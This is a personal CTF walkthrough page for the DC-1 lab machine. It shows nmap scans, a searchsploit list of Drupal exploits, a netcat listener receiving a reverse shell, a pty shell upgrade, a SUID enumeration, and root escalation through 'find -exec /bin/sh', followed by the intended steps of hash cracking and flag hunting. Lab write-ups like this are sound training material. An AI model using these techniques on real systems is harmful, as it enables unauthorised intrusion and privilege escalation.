<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DC-1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="2019.html">2019</a></p>

<ol>
<li><a href="2019--BasicPenTestingBox.html">BasicPenTestingBox</a></li>
<li><a href="2019--BasicPenTestingBox2.html">BasicPenTestingBox2</a></li>
<li><a href="2019--bee_box.html">bee box</a></li>
<li><a href="2019--BossPlayer.html">BossPlayer</a></li>
<li><a href="2019--CyberChallenge19.html">CyberChallenge19</a></li>
<li><a href="2019--Dawn.html">Dawn</a></li>
<li><a href="2019--DC-1.html">DC-1</a></li>
<li><a href="2019--DC-2.html">DC-2</a></li>
<li><a href="2019--DC-3.html">DC-3</a></li>
<li><a href="2019--DerpNStik.html">DerpNStik</a></li>
<li><a href="2019--EVM.html">EVM</a></li>
<li><a href="2019--Fowsniff.html">Fowsniff</a></li>
<li><a href="2019--Gemini_Inc_1.html">Gemini Inc 1</a></li>
<li><a href="2019--JIS_CTF.html">JIS_CTF</a></li>
<li><a href="2019--mullidae.html">mullidae</a></li>
<li><a href="2019--PumpkinFestival.html">PumpkinFestival</a></li>
<li><a href="2019--PumpkinGarden.html">PumpkinGarden</a></li>
<li><a href="2019--PumpkinRaising.html">PumpkinRaising</a></li>
<li><a href="2019--QuaoarCTFHackfest2016.html">QuaoarCTFHackfest2016</a></li>
<li><a href="2019--Rickdiculously_Easy.html">Rickdiculously Easy</a></li>
<li><a href="2019--silky02.html">silky02</a></li>
<li><a href="2019--silky1.html">silky1</a></li>
<li><a href="2019--Typhoon.html">Typhoon</a></li>
<li><a href="2019--VMS_to_try.html">VMS to try</a></li>
<ol>
<li><a href="2019--VMS_to_try--US_Gov_Conf.html">US Gov Conf</a></li>
<li><a href="2019--VMS_to_try--Gruyere.html">Gruyere</a></li>
</ol>
<li><a href="2019--xss_challenges.html">xss challenges</a></li>
<li><a href="2019--Blue.html">Blue</a></li>
<li><a href="2019--mr_robot.html">mr robot</a></li>
<li><a href="2019--Unfinished_VMS.html">Unfinished VMS</a></li>
<ol>
<li><a href="2019--Unfinished_VMS--CasinoRoyale.html">CasinoRoyale</a></li>
<li><a href="2019--Unfinished_VMS--WinterMute_Straylight.html">WinterMute Straylight</a></li>
<li><a href="2019--Unfinished_VMS--connect_the_dots_(unfinished).html">connect the dots (unfinished)</a></li>
<li><a href="2019--Unfinished_VMS--arsenal.html">arsenal</a></li>
<li><a href="2019--Unfinished_VMS--heist.html">heist</a></li>
<li><a href="2019--Unfinished_VMS--MyHouse_Box.html">MyHouse Box</a></li>
<li><a href="2019--Unfinished_VMS--Sputnik.html">Sputnik</a></li>
<li><a href="2019--Unfinished_VMS--Node.html">Node</a></li>
<li><a href="2019--Unfinished_VMS--HackInOs.html">HackInOs</a></li>
<li><a href="2019--Unfinished_VMS--Seattle.html">Seattle</a></li>
<li><a href="2019--Unfinished_VMS--DC416-Galahad.html">DC416-Galahad</a></li>
</ol>
<li><a href="2019--Not_a_Box.html">Not a Box</a></li>
<ol>
<li><a href="2019--Not_a_Box--securitytreasurehunt_web.html">securitytreasurehunt web</a></li>
<li><a href="2019--Not_a_Box--rpc.html">rpc</a></li>
<li><a href="2019--Not_a_Box--msf_fix.html">msf fix</a></li>
</ol>
<li><a href="2019--ICE.html">ICE</a></li>
</ol></div>
<div class="page"><h1><b><u>DC-1</u></b></h1><br />Nmap scan report for 192.168.56.106<br />Host is up (0.00012s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />80/tcp  open  http<br />111/tcp open  rpcbind<br />MAC Address: 08:00:27:44:A5:9C (Oracle VirtualBox virtual NIC)<br /><br />root@kali:~# nmap -A -p- 192.168.56.106<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-01 10:00 EDT<br />Nmap scan report for 192.168.56.106<br />Host is up (0.00042s latency).<br />Not shown: 65531 closed ports<br />PORT      STATE SERVICE VERSION<br />22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)<br />|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)<br />|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)<br />80/tcp    open  http    Apache httpd 2.2.22 ((Debian))<br />|_http-generator: Drupal 7 (<a href="http://drupal.org)">http://drupal.org)</a><br />| http-robots.txt: 36 disallowed entries (15 shown)<br />| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br />| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br />| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br />|_/LICENSE.txt /MAINTAINERS.txt<br />|_http-server-header: Apache/2.2.22 (Debian)<br />|_http-title: Welcome to Drupal Site | Drupal Site<br />111/tcp   open  rpcbind 2-4 (RPC #100000)<br />| rpcinfo: <br />|   program version    port/proto  service<br />|   100000  2,3,4        111/tcp   rpcbind<br />|   100000  2,3,4        111/udp   rpcbind<br />|   100000  3,4          111/tcp6  rpcbind<br />|   100000  3,4          111/udp6  rpcbind<br />|   100024  1          45845/tcp   status<br />|   100024  1          49741/udp   status<br />|   100024  1          50288/tcp6  status<br />|_  100024  1          52977/udp6  status<br />45845/tcp open  status  1 (RPC #100024)<br />MAC Address: 08:00:27:44:A5:9C (Oracle VirtualBox virtual NIC)<br />Device type: general purpose<br />Running: Linux 3.X<br />OS CPE: cpe:/o:linux:linux_kernel:3<br />OS details: Linux 3.2 - 3.16<br />Network Distance: 1 hop<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE<br />HOP RTT     ADDRESS<br />1   0.42 ms 192.168.56.106<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds<br />root@kali:~# <br /><br /><img src="images/15-1.png" alt="images/15-1.png" /><br /><br />#<br /># robots.txt<br />#<br /># This file is to prevent the crawling and indexing of certain parts<br /># of your site by web crawlers and spiders run by sites like Yahoo!<br /># and Google. By telling these "robots" where not to go on your site,<br /># you save bandwidth and server resources.<br />#<br /># This file will be ignored unless it is at the root of your host:<br /># Used:    http://example.com/robots.txt<br /># Ignored: http://example.com/site/robots.txt<br />#<br /># For more information about the robots.txt standard, see:<br /># http://www.robotstxt.org/wc/robots.html<br />#<br /># For syntax checking, see:<br /># http://www.sxw.org.uk/computing/robots/check.html<br /><br />User-agent: *<br />Crawl-delay: 10<br /># Directories<br />Disallow: /includes/<br />Disallow: /misc/<br />Disallow: /modules/<br />Disallow: /profiles/<br />Disallow: /scripts/<br />Disallow: /themes/<br /># Files<br />Disallow: /CHANGELOG.txt<br />Disallow: /cron.php<br />Disallow: /INSTALL.mysql.txt<br />Disallow: /INSTALL.pgsql.txt<br />Disallow: /INSTALL.sqlite.txt<br />Disallow: /install.php<br />Disallow: /INSTALL.txt<br />Disallow: /LICENSE.txt<br />Disallow: /MAINTAINERS.txt<br />Disallow: /update.php<br />Disallow: /UPGRADE.txt<br />Disallow: /xmlrpc.php<br /># Paths (clean URLs)<br />Disallow: /admin/<br />Disallow: /comment/reply/<br />Disallow: /filter/tips/<br />Disallow: /node/add/<br />Disallow: /search/<br />Disallow: /user/register/<br />Disallow: /user/password/<br />Disallow: /user/login/<br />Disallow: /user/logout/<br /># Paths (no clean URLs)<br />Disallow: /?q=admin/<br />Disallow: /?q=comment/reply/<br />Disallow: /?q=filter/tips/<br />Disallow: /?q=node/add/<br />Disallow: /?q=search/<br />Disallow: /?q=user/password/<br />Disallow: /?q=user/register/<br />Disallow: /?q=user/login/<br />Disallow: /?q=user/logout/<br /><br /><img src="images/15-2.png" alt="images/15-2.png" /><br /><br /><br />root@kali:~# searchsploit drupal 7<br />--------------------------------------- ----------------------------------------<br /> Exploit Title                         |  Path<br />                                       | (/usr/share/exploitdb/)<br />--------------------------------------- ----------------------------------------<br />Drupal 4.7 - 'Attachment mod_mime' Rem | exploits/php/webapps/1821.php<br />Drupal 4.x - URL-Encoded Input HTML In | exploits/php/webapps/27020.txt<br />Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL | exploits/php/webapps/34984.py<br />Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL | exploits/php/webapps/34992.py<br />Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL | exploits/php/webapps/34993.php<br />Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL | exploits/php/webapps/35150.php<br />Drupal 7.0 &lt; 7.31 - 'Drupalgeddon' SQL | exploits/php/webapps/44355.php<br />Drupal 7.12 - Multiple Vulnerabilities | exploits/php/webapps/18564.txt<br />Drupal 7.x Module Services - Remote Co | exploits/php/webapps/41564.php<br />Drupal &lt; 4.7.6 - Post Comments Remote  | exploits/php/webapps/3313.pl<br />Drupal &lt; 5.22/6.16 - Multiple Vulnerab | exploits/php/webapps/33706.txt<br />Drupal &lt; 7.34 - Denial of Service      | exploits/php/dos/35415.txt<br />Drupal &lt; 7.58 - 'Drupalgeddon3' (Authe | exploits/php/webapps/44542.txt<br />Drupal &lt; 7.58 - 'Drupalgeddon3' (Authe | exploits/php/webapps/44557.rb<br />Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt;  | exploits/php/webapps/44449.rb<br />Drupal Module CKEditor &lt; 4.1WYSIWYG (D | exploits/php/webapps/25493.txt<br />Drupal Module Coder &lt; 7.x-1.3/7.x-2.6  | exploits/php/remote/40144.php<br />Drupal Module Cumulus 5.x-1.1/6.x-1.4  | exploits/php/webapps/35397.txt<br />Drupal Module Drag &amp; Drop Gallery 6.x- | exploits/php/webapps/37453.php<br />Drupal Module Embedded Media Field/Med | exploits/php/webapps/35072.txt<br />Drupal Module RESTWS 7.x - PHP Remote  | exploits/php/remote/40130.rb<br />Drupal avatar_uploader v7.x-1.0-beta8  | exploits/php/webapps/44501.txt<br />--------------------------------------- ----------------------------------------<br />Shellcodes: No Result<br />root@kali:~# <br /><br /><img src="images/15-3.png" alt="images/15-3.png" /><br /><br /><img src="images/15-4.png" alt="images/15-4.png" /><br /><br /><img src="images/15-5.png" alt="images/15-5.png" /><br /><br /><img src="images/15-6.png" alt="images/15-6.png" /><br /><br /><img src="images/15-7.png" alt="images/15-7.png" /><br /><br /><img src="images/15-8.png" alt="images/15-8.png" /><br /><br /><img src="images/15-9.png" alt="images/15-9.png" /><br /><br /><br /><img src="images/15-10.png" alt="images/15-10.png" /><br /><br /><img src="images/15-11.png" alt="images/15-11.png" /><br /><br />nc -lvp 1234<br /><br /><img src="images/15-12.png" alt="images/15-12.png" /><br /><br />root@kali:~# nc -lvp 1234<br />listening on [any] 1234 ...<br />192.168.56.106: inverse host lookup failed: Unknown host<br />connect to [192.168.56.1] from (UNKNOWN) [192.168.56.106] 51873<br />python -c 'import pty; pty.spawn("/bin/bash")'<br />www-data@DC-1:/var/www$ find / -perm u=s -type f 2&gt;/dev/null<br />find / -perm u=s -type f 2&gt;/dev/null<br />www-data@DC-1:/var/www$ find / -perm /4000 2&gt;/dev/null<br />find / -perm /4000 2&gt;/dev/null<br />/bin/mount<br />/bin/ping<br />/bin/su<br />/bin/ping6<br />/bin/umount<br />/usr/bin/at<br />/usr/bin/chsh<br />/usr/bin/passwd<br />/usr/bin/newgrp<br />/usr/bin/chfn<br />/usr/bin/gpasswd<br />/usr/bin/procmail<br />/usr/bin/find<br />/usr/sbin/exim4<br />/usr/lib/pt_chown<br />/usr/lib/openssh/ssh-keysign<br />/usr/lib/eject/dmcrypt-get-device<br />/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br />/sbin/mount.nfs<br />www-data@DC-1:/var/www$ <br /><br />-&gt; use find to spawn a shell:<br /><br />www-data@DC-1:/var/www$ find . -exec '/bin/sh' \;<br />find . -exec '/bin/sh' \;<br /># whoami<br />whoami<br />root<br /># cd /root<br />cd /root<br /># ls<br />ls<br />thefinalflag.txt<br /># cat thefinalflag.txt<br />cat thefinalflag.txt<br />Well done!!!!<br /><br />Hopefully you've enjoyed this and learned some new skills.<br /><br />You can let me know what you thought of this little journey<br />by contacting me via Twitter - @DCAU7<br /># <br /><br />Finding the flags:<br /><br /># find / -name flag*<br />find / -name flag*<br />/home/flag4<br />/home/flag4/flag4.txt<br />/var/www/flag1.txt<br /><br />Flag 2:<br />cd /var/www/sites/default/settings.php<br /><br /><img src="images/15-13.png" alt="images/15-13.png" /><br /><br />-&gt; flag4 you have to do some other stuff<br /><br />Intended Way to do this box:<br />1- Using metasploit or any other exploits which gives you a reverse shell (without logging-in to drupal).<br />2- Read flag1.txt file.<br />3- Read settings.php file.<br />4- Login to mysql database.<br />5- Extract users table information.<br />6- Crack users passwords using hashcat.<br />7- Login using the cracked passwords to drupal admin area.<br />8- Find the third flag which will give you a hint.<br />9- Return back to the reverse shell and try to read the fourth flag (flag4.txt) using the find command.<br />10-  Read flag4.txt using find command and then read the thefinalflag.txt  (but first, we have to list the /root directory contents) using the same  methods.<br /><br /><br /><br /></div></div>
</body></html>